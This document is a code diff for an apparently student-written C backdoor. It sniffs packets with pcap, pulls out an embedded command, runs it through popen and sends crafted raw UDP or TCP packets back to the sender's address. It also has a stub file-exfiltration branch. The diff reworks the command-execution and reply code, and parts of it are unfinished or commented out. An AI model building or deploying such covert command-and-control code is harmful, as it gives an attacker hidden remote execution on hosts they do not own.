@@ -164,8 +164,9 @@ void client(struct client_opt c_opt){
     
     /* Receive reply and print */
     
-    // Initialize variables
     printf("Waiting for reply...\n");
+    
+    // Initialize variables    
     int sockfd, n;
     struct sockaddr_in server, client;
     memset(&server, 0, sizeof(struct sockaddr_in));
@@ -269,7 +270,7 @@ void server(struct server_opt s_opt){
 
     // Packet capture loop
     printf("Capturing...\n");
-    pcap_loop(handle, -1, packet_handler, NULL);
+    pcap_loop(handle, -1, packet_handler, (u_char *)&s_opt);
 }
 
 /*
@@ -462,13 +463,12 @@ int send_udp_datagram(struct addr_info *user_addr, char *data, int data_len){
 
 void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet){
     
+    struct server_opt *s_opt_ptr = (struct server_opt *)args;
+    
     printf("\n");
     printf("Got packet...\n");
     
     /* Parse packet */
-    
-    // Print its length
-	//printf("Jacked a packet with length of [%d]\n", header->len);
     
     // Get packet info
     struct parsed_packet packet_info = {0}; // Initialize with 0
@@ -494,21 +494,6 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         return;
     }
     
-    /* Prepare address */
-    
-    struct sockaddr_in dst_host;
-    
-    memset(&dst_host, 0, sizeof(struct sockaddr_in));
-    dst_host.sin_family = AF_INET;
-    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
-
-    if(packet_info.ip->ip_p == IPPROTO_UDP){
-        dst_host.sin_port = packet_info.udp->uh_sport;
-    }
-    else if(packet_info.ip->ip_p == IPPROTO_TCP){
-        dst_host.sin_port = packet_info.tcp->th_sport;
-    }
-    
     /* Handle command */
     
     // If file exfil command
@@ -516,32 +501,97 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         printf("EXFIL");
     }
     else{ // Normal command
-        server_command(bd_command, &dst_host);
+        
+        /* Execute command */
+    
+        FILE *fp;
+        fp = popen(bd_command, "r");
+        if(fp == NULL){
+            printf("Command error!\n");
+            return;
+        }
+        printf("Command executed.\n");
+        
+        //server_command(bd_command, &dst_host);
     }
     
-}
-
-/*
-| ------------------------------------------------------------------------------
-| Execute command
-| ------------------------------------------------------------------------------
-*/
-
-void server_command(char *bd_command, struct sockaddr_in *dst_host){
+    /* Get destination port from packet based on TCP or UDP
+       Create a raw socket and set SO_REUSEADDR */
     
-    /* Execute command */
+    u_short dport = 0; // Destination port is the source port of the packet
+    u_short sport = 0; // Source port is the destination port of the packet
+    int skt;
+    if(packet_info.ip->ip_p == IPPROTO_UDP){
+        dport = packet_info.udp->uh_sport;
+        sport = packet_info.udp->uh_dport;
+        skt = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+    }
+    else if(packet_info.ip->ip_p == IPPROTO_TCP){
+        dport = packet_info.tcp->th_sport;
+        sport = packet_info.tcp->th_dport;
+        skt = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    }
     
-    FILE *fp;
-    fp = popen(bd_command, "r");
-    if(fp == NULL){
-        printf("Command error!\n");
+    int arg = 1;
+    if(setsockopt(skt, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
+        system_fatal("setsockopt");
+    
+    /* Get host IP from interface */
+    
+    struct ifreq ifr;
+    size_t if_name_len = strlen(s_opt_ptr->device);
+    if (if_name_len < sizeof(ifr.ifr_name)) {
+        memcpy(ifr.ifr_name, s_opt_ptr->device, if_name_len);
+        ifr.ifr_name[if_name_len] = 0;
+    }
+    else {
+        printf("Interface name is too long");
         return;
     }
-    printf("Command executed.\n");
+    
+    if(ioctl(skt,SIOCGIFADDR, &ifr) == -1) {
+        int temp_errno=errno;
+        close(skt);
+        printf("%s",strerror(temp_errno));
+        return;
+    }
+    
+    // Cast to sockaddr_in and extract sin_addr
+    struct sockaddr_in* hostaddr = (struct sockaddr_in*)&ifr.ifr_addr;
+    printf("IP address: %s\n",inet_ntoa(hostaddr->sin_addr));
+    
+    /* Prepare destination sockaddr_in */
+    
+    struct sockaddr_in dst_host;
+    
+    memset(&dst_host, 0, sizeof(struct sockaddr_in));
+    dst_host.sin_family = AF_INET;
+    dst_host.sin_addr.s_addr = packet_info.ip->ip_src.s_addr;
+    dst_host.sin_port = dport;
+    
+    /* Prepare address info structure for raw packet crafting */
+    
+    struct addr_info server_addr;
+    server_addr.shost = inet_ntoa(hostaddr->sin_addr);
+    server_addr.sport = sport;
+    server_addr.dhost = inet_ntoa(packet_info.ip->ip_src);
+    server_addr.dport = dport;
+    server_addr.raw_socket = skt;
+    
+    char test[] = "nexus";
+    
+    send_udp_datagram(&server_addr, test, sizeof(test));
+    //send_tcp_datagram(&server_addr, test, sizeof(text));
+            
+    // Send packet
+     if(s_opt_ptr->protocol == 1)
+        send_udp_datagram(&server_addr, test, sizeof(test));
+    else
+        send_tcp_datagram(&server_addr, test, sizeof(test));
     
     /* Send results back to client */
     
-    // Open UDP socket
+    /*// Open UDP socket
     int sockfd;
     sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     int arg = 1;
@@ -555,11 +605,27 @@ void server_command(char *bd_command, struct sockaddr_in *dst_host){
     sendto(sockfd, output, strlen(output), 0, (struct sockaddr *)dst_host, sizeof(struct sockaddr_in));
     printf("Sent results back to client.\n");
     
-    /* Cleanup */
-    
+    // Cleanup
     free(bd_command);
     close(sockfd);
-    pclose(fp);
+    pclose(fp);*/
+    
+    
+    
+    
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Execute command
+| ------------------------------------------------------------------------------
+*/
+
+void server_command(char *bd_command, struct sockaddr_in *dst_host){
+    
+    
+    
+    
 }
 
 /*
